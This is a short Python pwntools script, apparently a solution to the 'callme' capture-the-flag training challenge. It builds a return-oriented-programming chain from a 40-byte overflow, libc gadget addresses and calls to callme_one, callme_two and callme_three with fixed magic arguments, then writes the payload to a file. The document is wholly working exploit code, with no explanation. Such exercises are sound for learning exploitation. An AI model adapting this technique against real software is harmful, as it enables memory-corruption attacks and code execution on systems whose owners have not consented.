#!/bin/python3

from pwn import *

offset = 40
base = 0x00400000
libCBase = 0x7ffff7a19000
libCallme = 0x7ffff7c00000

mov = p64(libCBase + 0x0a2e50);
popRDXRBX = p64(libCBase + 0x0826d9);
popRDI = p64(libCBase + 0x023875);
popRSI = p64(libCBase + 0x025191);

callmeOne = p64(libCallme + 0x0000081a)
callmeTwo = p64(libCallme + 0x00092b)
callmeThree = p64(libCallme + 0x000a2d)

usefulFunc = p64(base + 0x08f2)

ret = p64(libCBase+0x23206)

rop = b"A" * offset
rop += popRDI
rop += p64(0x0601040)
rop += popRDXRBX
rop += callmeOne
rop += callmeOne
rop += mov
rop += popRDI
rop += p64(0x0601050)
rop += popRDXRBX
rop += callmeTwo
rop += callmeTwo
rop += mov
rop += popRDI
rop += p64(0x0601028)
rop += popRDXRBX
rop += callmeThree
rop += callmeThree
rop += mov
rop += popRDI
rop += p64(0xdeadbeefdeadbeef)
rop += popRSI
rop += p64(0xcafebabecafebabe)
rop += popRDXRBX
rop += p64(0xd00df00dd00df00d)
rop += p64(0xd00df00dd00df00d)
rop += p64(base + 0x0720)
rop += popRDI
rop += p64(0xdeadbeefdeadbeef)
rop += popRSI
rop += p64(0xcafebabecafebabe)
rop += popRDXRBX
rop += p64(0xd00df00dd00df00d)
rop += p64(0xd00df00dd00df00d)
rop += p64(base + 0x0740)
rop += popRDI
rop += p64(0xdeadbeefdeadbeef)
rop += popRSI
rop += p64(0xcafebabecafebabe)
rop += popRDXRBX
rop += p64(0xd00df00dd00df00d)
rop += p64(0xd00df00dd00df00d)
rop += p64(base + 0x06f0)


with open ('data', 'wb') as f:
	f.write(rop)
